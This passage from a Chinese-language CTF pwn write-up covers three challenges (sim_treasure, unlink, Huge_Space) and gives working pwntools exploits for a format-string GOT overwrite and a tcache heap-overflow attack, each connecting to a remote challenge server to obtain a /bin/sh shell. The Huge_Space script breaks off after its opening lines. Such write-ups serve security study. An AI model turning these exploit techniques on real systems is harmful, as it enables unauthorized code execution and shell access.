<span class="line" data-line="70"><span style="color:#E1E4E8">p.interactive()</span></span></code></pre>
<h3 id="sim_treasure">sim_treasure</h3>
<p>格式化字符串漏洞挟持，通过 <code>printf</code> 幻术的 <code>got</code> 表，改换 <code>system</code> ，将下一次程序调用<code>printf</code> 的时候传入 <code>’/bin/sh’</code> 即可 <code>GetShell</code> 。</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#F97583">from</span><span style="color:#E1E4E8"> pwn </span><span style="color:#F97583">import</span><span style="color:#F97583"> *</span></span>
<span class="line" data-line="2"><span style="color:#E1E4E8">context.log_level</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">'debug'</span></span>
<span class="line" data-line="3"><span style="color:#E1E4E8">io</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">remote(</span><span style="color:#9ECBFF">"123.57.69.203"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">7010</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="4"><span style="color:#E1E4E8">elf </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> ELF(</span><span style="color:#9ECBFF">"./sp1"</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="5"><span style="color:#E1E4E8">libc </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> ELF(</span><span style="color:#9ECBFF">"./libc-2.27.so"</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="6"><span style="color:#E1E4E8">puts_got </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> elf.got[</span><span style="color:#9ECBFF">'puts'</span><span style="color:#E1E4E8">]</span></span>
<span class="line" data-line="7"><span style="color:#E1E4E8">io.recvuntil(</span><span style="color:#9ECBFF">"Can you find the magic word?</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="8"><span style="color:#E1E4E8">pay </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> p32(elf.got[</span><span style="color:#9ECBFF">"puts"</span><span style="color:#E1E4E8">])</span><span style="color:#F97583">+</span><span style="color:#F97583">b</span><span style="color:#9ECBFF">"%6$s"</span></span>
<span class="line" data-line="9"><span style="color:#E1E4E8">io.sendline(pay)</span></span>
<span class="line" data-line="10"><span style="color:#E1E4E8">io.recv(</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="11"><span style="color:#E1E4E8">puts_addr </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> u32(io.recv(</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">))</span></span>
<span class="line" data-line="12"></span>
<span class="line" data-line="13"><span style="color:#E1E4E8">printf_got </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> elf.got[</span><span style="color:#9ECBFF">'printf'</span><span style="color:#E1E4E8">]</span></span>
<span class="line" data-line="14"><span style="color:#E1E4E8">libc_base </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> puts_addr </span><span style="color:#F97583">-</span><span style="color:#E1E4E8"> libc.symbols[</span><span style="color:#9ECBFF">'puts'</span><span style="color:#E1E4E8">]</span></span>
<span class="line" data-line="15"><span style="color:#E1E4E8">system_addr </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> libc_base </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> libc.symbols[</span><span style="color:#9ECBFF">'system'</span><span style="color:#E1E4E8">]</span></span>
<span class="line" data-line="16"><span style="color:#E1E4E8">io.sendline(</span><span style="color:#9ECBFF">"A"</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="17"></span>
<span class="line" data-line="18"><span style="color:#E1E4E8">payload1 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> fmtstr_payload(</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">, {printf_got: system_addr})</span></span>
<span class="line" data-line="19"><span style="color:#E1E4E8">io.recvuntil(</span><span style="color:#9ECBFF">"A</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="20"><span style="color:#E1E4E8">io.sendline(payload1)</span></span>
<span class="line" data-line="21"><span style="color:#E1E4E8">io.sendline(</span><span style="color:#9ECBFF">"/bin/sh"</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="22"><span style="color:#E1E4E8">io.interactive()</span><span style="color:#FDAEB7;font-style:italic">;</span></span></code></pre>
<h3 id="unlink">unlink</h3>
<p>主函数里面给了个后门</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line" data-line="1"><span style="color:#F97583">void</span><span style="color:#E1E4E8"> __cdecl </span><span style="color:#B392F0">sh</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">char</span><span style="color:#F97583"> *</span><span style="color:#FFAB70">c</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="2"><span style="color:#E1E4E8">{</span></span>
<span class="line" data-line="3"><span style="color:#B392F0">  system</span><span style="color:#E1E4E8">(c);</span></span>
<span class="line" data-line="4"><span style="color:#E1E4E8">}</span></span></code></pre>
<p>这题就是一个很简单的 <code>堆溢出漏洞</code> 结合 <code>tcache attack</code> ，将包含 <code>cmd</code> 的 <code>fake_chunk</code> 链入 <code>tcache bins</code> ，从而将 <code>cmd</code> 这个指针改为指向 <code>free@got</code> ，进而而改写 <code>got</code> 表。</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#6A737D"># coding=utf-8</span></span>
<span class="line" data-line="2"><span style="color:#6A737D"># *- coding:utf-8 -*-</span></span>
<span class="line" data-line="3"><span style="color:#6A737D"># from pwn_debug import *</span></span>
<span class="line" data-line="4"><span style="color:#F97583">from</span><span style="color:#E1E4E8"> struct </span><span style="color:#F97583">import</span><span style="color:#E1E4E8"> pack</span></span>
<span class="line" data-line="5"><span style="color:#F97583">from</span><span style="color:#E1E4E8"> pwn </span><span style="color:#F97583">import</span><span style="color:#F97583"> *</span></span>
<span class="line" data-line="6"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> sys;</span><span style="color:#F97583">import</span><span style="color:#E1E4E8"> time;</span><span style="color:#F97583">import</span><span style="color:#E1E4E8"> os</span></span>
<span class="line" data-line="7"><span style="color:#6A737D"># from LibcSearcher import *</span></span>
<span class="line" data-line="8"><span style="color:#6A737D"># 设置timeout;sh.timeout = 0.1</span></span>
<span class="line" data-line="9"><span style="color:#E1E4E8">context(</span><span style="color:#FFAB70">os</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">"linux"</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">arch</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">"amd64"</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">log_level</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">"debug"</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="10"><span style="color:#6A737D"># context(os="linux",arch="i386",log_level="debug")</span></span>
<span class="line" data-line="11"><span style="color:#6A737D"># context.terminal = ["tmux", "splitw", "-h"] ; context.arch = "amd64" ;</span></span>
<span class="line" data-line="12"><span style="color:#E1E4E8">context.log_level</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">"debug"</span><span style="color:#6A737D"> # 暂无这个</span></span>
<span class="line" data-line="13"><span style="color:#6A737D"># tmux 换到4.7以上再说</span></span>
<span class="line" data-line="14"><span style="color:#E1E4E8">filename </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "attachment-38"</span></span>
<span class="line" data-line="15"><span style="color:#E1E4E8">libcpath </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> ""</span></span>
<span class="line" data-line="16"><span style="color:#E1E4E8">sh </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span></span>
<span class="line" data-line="17"><span style="color:#E1E4E8">lib </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span></span>
<span class="line" data-line="18"><span style="color:#E1E4E8">elf </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> ELF(filename) </span><span style="color:#6A737D"># local长</span></span>
<span class="line" data-line="19"><span style="color:#E1E4E8">local_libc </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> ELF(</span><span style="color:#9ECBFF">"/lib/x86_64-linux-gnu/libc.so.6"</span><span style="color:#E1E4E8">) </span><span style="color:#6A737D">#</span></span>
<span class="line" data-line="20"><span style="color:#6A737D"># remote_buu_libc = ELF("/home/rencvn/Desktop/install/libc-2.27.so",checksec =False)</span></span>
<span class="line" data-line="21"><span style="color:#6A737D"># libc = ELF("/home/rencvn/Desktop/BUU/Glibc/Ubuntu18_GLIBC_2.27-3ubuntu1/64/libc-2.27.so")</span></span>
<span class="line" data-line="22"><span style="color:#E1E4E8">u16_local_one </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> [</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">45216</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">4526a</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">f02a4</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">f1147</span><span style="color:#E1E4E8">] </span><span style="color:#6A737D"># one_gadget (-l2)/lib/x86_64-linux-gnu/libc.so.6 giantbranch 2.23-0ubuntu10</span></span>
<span class="line" data-line="23"><span style="color:#E1E4E8">u18_local_one </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> [</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">4f2a5</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">4f302</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">10a2fc</span><span style="color:#E1E4E8">] </span><span style="color:#6A737D"># one_gadget (-l2) /lib/x86_64-linuxgnu/libc.so.6 Rencvn 2.27-3ubuntu1.5</span></span>
<span class="line" data-line="24"><span style="color:#E1E4E8">u20_local_one </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> [</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">e3b2e</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">e3b31</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">e3b34</span><span style="color:#E1E4E8">] </span><span style="color:#6A737D"># one_gadget (-l2) /lib/x86_64-linuxgnu/libc.so.6 Ln-Pwn 2.31-0ubuntu9.7</span></span>
<span class="line" data-line="25"><span style="color:#9ECBFF">""" """</span></span>
<span class="line" data-line="26"><span style="color:#E1E4E8">l64 </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> :u64(sh.recvuntil(</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\x7f</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">)[</span><span style="color:#F97583">-</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">:].ljust(</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">))</span></span>
<span class="line" data-line="27"><span style="color:#E1E4E8">l32 </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> :u32(sh.recvuntil(</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\x7f</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">)[</span><span style="color:#F97583">-</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">:].ljust(</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">))</span></span>
<span class="line" data-line="28"><span style="color:#6A737D">#bytes ==> int</span></span>
<span class="line" data-line="29"><span style="color:#6A737D">#常用于调用了ROP输出类函数后，接受并转化为int类型</span></span>
<span class="line" data-line="30"><span style="color:#6A737D"># uxx( ru("\x7f")[-6:].ljust(8,"\x00") )</span></span>
<span class="line" data-line="31"><span style="color:#E1E4E8">leak</span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> name,data :sh.success(name </span><span style="color:#F97583">+</span><span style="color:#9ECBFF"> ": 0x</span><span style="color:#79B8FF">%x</span><span style="color:#9ECBFF">"</span><span style="color:#F97583"> %</span><span style="color:#E1E4E8"> data)</span></span>
<span class="line" data-line="32"><span style="color:#E1E4E8">s </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> payload :sh.send( payload)</span></span>
<span class="line" data-line="33"><span style="color:#E1E4E8">sa </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> a,b :sh.sendafter(</span><span style="color:#79B8FF">str</span><span style="color:#E1E4E8">(a),</span><span style="color:#79B8FF">str</span><span style="color:#E1E4E8">(b))</span></span>
<span class="line" data-line="34"><span style="color:#E1E4E8">sl </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> payload :sh.sendline(payload )</span></span>
<span class="line" data-line="35"><span style="color:#E1E4E8">sla </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> a,b :sh.sendlineafter(</span><span style="color:#79B8FF">str</span><span style="color:#E1E4E8"> (a),</span><span style="color:#79B8FF">str</span><span style="color:#E1E4E8">(b))</span></span>
<span class="line" data-line="36"><span style="color:#E1E4E8">ru </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> a :sh.recvuntil(</span><span style="color:#79B8FF">str</span><span style="color:#E1E4E8">(a))</span></span>
<span class="line" data-line="37"><span style="color:#E1E4E8">r </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> numb</span><span style="color:#F97583">=</span><span style="color:#79B8FF">4096</span><span style="color:#E1E4E8"> :sh.recv(numb)</span></span>
<span class="line" data-line="38"><span style="color:#6A737D"># https://www.yuque.com/squirre17/qqf7/wbeago #5b71964e</span></span>
<span class="line" data-line="39"><span style="color:#E1E4E8">rl </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> :sh.recvline()</span></span>
<span class="line" data-line="40"><span style="color:#E1E4E8">uu32</span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> data :u32(data.ljust(</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">b</span><span style="color:#9ECBFF">'</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">))</span></span>
<span class="line" data-line="41"><span style="color:#E1E4E8">uu64</span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> data :u64(data.ljust(</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">b</span><span style="color:#9ECBFF">'</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">))</span></span>
<span class="line" data-line="42"><span style="color:#6A737D"># https://blog.cc arol2358/article/details/106262701</span></span>
<span class="line" data-line="43"><span style="color:#E1E4E8">info_addr </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> tag, addr :sh.info(tag </span><span style="color:#F97583">+</span><span style="color:#9ECBFF"> ': </span><span style="color:#79B8FF">{</span><span style="color:#F97583">:#x</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">. </span><span style="color:#79B8FF">format</span><span style="color:#E1E4E8">(addr))</span></span>
<span class="line" data-line="44"><span style="color:#E1E4E8">check </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> data :</span><span style="color:#9ECBFF">"data="</span><span style="color:#E1E4E8">,data,</span><span style="color:#9ECBFF">"|*|"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"type=>"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">type</span><span style="color:#E1E4E8">(data)</span></span>
<span class="line" data-line="45"><span style="color:#6A737D"># 这里使用print会报错</span></span>
<span class="line" data-line="46"><span style="color:#6A737D"># 交互时</span></span>
<span class="line" data-line="47"><span style="color:#6A737D"># py2 &#x3C;==> str = bytes</span></span>
<span class="line" data-line="48"><span style="color:#6A737D">#addr=int(sh.recvuntil('\n',drop=True),base=16)</span></span>
<span class="line" data-line="49"><span style="color:#F97583">def</span><span style="color:#B392F0"> add</span><span style="color:#E1E4E8">(index,size,data):</span></span>
<span class="line" data-line="50"><span style="color:#E1E4E8">    success(</span><span style="color:#9ECBFF">"########->add&#x3C;-########"</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="51"><span style="color:#E1E4E8">    sl(</span><span style="color:#9ECBFF">"add"</span><span style="color:#E1E4E8">) </span><span style="color:#6A737D"># fgets</span></span>
<span class="line" data-line="52"><span style="color:#E1E4E8">    sla(</span><span style="color:#9ECBFF">"Index: "</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">str</span><span style="color:#E1E4E8">(index))</span></span>
<span class="line" data-line="53"><span style="color:#E1E4E8">    sla(</span><span style="color:#9ECBFF">"Size: "</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">str</span><span style="color:#E1E4E8">(size)) </span><span style="color:#6A737D"># scanf</span></span>
<span class="line" data-line="54"><span style="color:#E1E4E8">    sa(</span><span style="color:#9ECBFF">"Data: "</span><span style="color:#E1E4E8">,data</span><span style="color:#F97583">+</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">) </span><span style="color:#6A737D"># gets</span></span>
<span class="line" data-line="55"><span style="color:#F97583">def</span><span style="color:#B392F0"> delete</span><span style="color:#E1E4E8">(index):</span></span>
<span class="line" data-line="56"><span style="color:#E1E4E8">    success(</span><span style="color:#9ECBFF">"########->delete&#x3C;-########"</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="57"><span style="color:#E1E4E8">    sl(</span><span style="color:#9ECBFF">"remove"</span><span style="color:#E1E4E8">) </span><span style="color:#6A737D"># fgets</span></span>
<span class="line" data-line="58"><span style="color:#E1E4E8">    sla(</span><span style="color:#9ECBFF">"Index: "</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">str</span><span style="color:#E1E4E8">(index)) </span><span style="color:#6A737D"># scanf</span></span>
<span class="line" data-line="59"><span style="color:#E1E4E8">sys </span><span style="color:#F97583">=</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">400896</span></span>
<span class="line" data-line="60"><span style="color:#6A737D">#sh = process("./unlink")</span></span>
<span class="line" data-line="61"><span style="color:#E1E4E8">sh </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> remote(</span><span style="color:#9ECBFF">"123.57.69.203"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">5810</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="62"><span style="color:#6A737D">#gdb.attach(sh,"b *0x400A78")</span></span>
<span class="line" data-line="63"><span style="color:#6A737D"># malloc #</span></span>
<span class="line" data-line="64"><span style="color:#6A737D">#gdb.attach(sh,"b *0x4009BD\n"+"b *0x400A8A\n"+"c\n"*(24) )</span></span>
<span class="line" data-line="65"><span style="color:#E1E4E8">add(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">410</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"aaaa"</span><span style="color:#E1E4E8">)</span><span style="color:#6A737D">#fake_chunk)#0</span></span>
<span class="line" data-line="66"><span style="color:#E1E4E8">add(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">e8</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"bbbb"</span><span style="color:#E1E4E8">)</span><span style="color:#6A737D">#1</span></span>
<span class="line" data-line="67"><span style="color:#E1E4E8">add(</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">4f0</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"cccc"</span><span style="color:#E1E4E8">)</span><span style="color:#6A737D">#2</span></span>
<span class="line" data-line="68"><span style="color:#E1E4E8">add(</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">60</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"/bin/sh</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">dddd"</span><span style="color:#E1E4E8">)</span><span style="color:#6A737D">#3</span></span>
<span class="line" data-line="69"><span style="color:#E1E4E8">add(</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">60</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"/bin/sh</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">eeee"</span><span style="color:#E1E4E8">)</span><span style="color:#6A737D">#4</span></span>
<span class="line" data-line="70"><span style="color:#E1E4E8">delete(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="71"><span style="color:#6A737D">#pause()</span></span>
<span class="line" data-line="72"><span style="color:#E1E4E8">delete(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="73"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">):</span></span>
<span class="line" data-line="74"><span style="color:#E1E4E8">    add(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">e8</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">i,</span><span style="color:#9ECBFF">"b"</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">e8</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">i))</span></span>
<span class="line" data-line="75"><span style="color:#E1E4E8">    delete(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="76"><span style="color:#E1E4E8">add(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">e8</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"b"</span><span style="color:#F97583">*0x</span><span style="color:#79B8FF">e0</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">510</span><span style="color:#E1E4E8">).decode(</span><span style="color:#9ECBFF">'unicode_escape'</span><span style="color:#E1E4E8">))</span><span style="color:#6A737D">#1</span></span>
<span class="line" data-line="77"><span style="color:#E1E4E8">delete(</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">) </span><span style="color:#6A737D">#合并chunk2+chunk1+chunk0</span></span>
<span class="line" data-line="78"><span style="color:#E1E4E8">success(</span><span style="color:#9ECBFF">"合并chunk"</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="79"><span style="color:#E1E4E8">delete(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="80"><span style="color:#E1E4E8">fgets_got </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> elf.got[</span><span style="color:#9ECBFF">"fgets"</span><span style="color:#E1E4E8">]</span><span style="color:#6A737D">#0x601050</span></span>
<span class="line" data-line="81"><span style="color:#E1E4E8">free_got </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> elf.got[</span><span style="color:#9ECBFF">"free"</span><span style="color:#E1E4E8">]</span><span style="color:#6A737D">#0x601018</span></span>
<span class="line" data-line="82"><span style="color:#E1E4E8">system_plt </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> elf.plt[</span><span style="color:#9ECBFF">"system"</span><span style="color:#E1E4E8">];system_got </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> elf.got[</span><span style="color:#9ECBFF">"system"</span><span style="color:#E1E4E8">]</span></span>
<span class="line" data-line="83"><span style="color:#E1E4E8">puts_plt </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> elf.plt[</span><span style="color:#9ECBFF">"puts"</span><span style="color:#E1E4E8">]</span></span>
<span class="line" data-line="84"></span>
<span class="line" data-line="85"><span style="color:#E1E4E8">add(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">10</span><span style="color:#F97583">+0x</span><span style="color:#79B8FF">410</span><span style="color:#F97583">+0x</span><span style="color:#79B8FF">e8</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">410</span><span style="color:#F97583">*</span><span style="color:#9ECBFF">"a"</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">420</span><span style="color:#E1E4E8">).decode(</span><span style="color:#9ECBFF">'unicode_escape'</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">f0</span><span style="color:#E1E4E8">).decode(</span><span style="color:#9ECBFF">'unicode_escape'</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(free_got).decode(</span><span style="color:#9ECBFF">'unicode_escape'</span><span style="color:#E1E4E8">))</span><span style="color:#6A737D">#chunk0 + chunk1</span></span>
<span class="line" data-line="86"><span style="color:#E1E4E8">add(</span><span style="color:#79B8FF">5</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">e0</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"/bin/sh</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">ffff"</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="87"><span style="color:#E1E4E8">add(</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">e0</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">3</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">p64(system_plt</span><span style="color:#F97583">+</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">).decode(</span><span style="color:#9ECBFF">'unicode_escape'</span><span style="color:#E1E4E8">))</span></span>
<span class="line" data-line="88"><span style="color:#6A737D">#add(6,0xe0,2*p64(0x400706)) #xxx</span></span>
<span class="line" data-line="89"><span style="color:#6A737D">#add(6,0xe0,2*p64(sys))</span></span>
<span class="line" data-line="90"><span style="color:#FFAB70">raw_input</span><span style="color:#E1E4E8">()</span></span>
<span class="line" data-line="91"><span style="color:#E1E4E8">sl(</span><span style="color:#9ECBFF">"/bin/sh</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="92"><span style="color:#6A737D">#delete(5)</span></span>
<span class="line" data-line="93"><span style="color:#E1E4E8">sh.interactive()</span></span></code></pre>
<h3 id="huge_space">Huge_Space</h3>
<p>开始 <code>gets(magic)</code> 有 <code>栈溢出</code>、<code>add</code> 功能有 <code>堆溢出</code> ，可申请任意大小的 <code>chunk</code> ，<code>cmd</code> 命令可 <code>输入</code> 数据 <code>过多</code> 。程序只有 <code>add</code> 和print函数（ <code>size</code> 可控，可 <code>泄露</code> 地址），还有一个后门 <code>sh：system(buf)</code></p>
<p>通过 <code>溢出栈</code>，布置栈迁移 <code>rop</code>，然后 <code>堆溢出</code> 覆盖 <code>topchunk</code>，<code>free</code> 到 <code>unsortedbin</code> ，申请出来泄露 <code>libc</code>，然后申请大内存，溢出覆盖 <code>tls</code> 结构的 <code>canary</code>
输入 <code>cmd</code> ，在 <code>cmd</code> 后面构造调用 <code>execve</code> 的 <code>rop</code>，<code>exit</code> 返回到 <code>main</code> 函数，绕过<code>canary</code>，栈迁移到 <code>bss</code> ，调用 <code>ececve</code></p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#6A737D"># -*- coding: UTF-8 -*-</span></span>
<span class="line" data-line="2"><span style="color:#F97583">from</span><span style="color:#E1E4E8"> pwn </span><span style="color:#F97583">import</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8"> </span></span>
<span class="line" data-line="3"></span>
<span class="line" data-line="4"><span style="color:#E1E4E8">context.log_level </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> 'debug'</span></span>
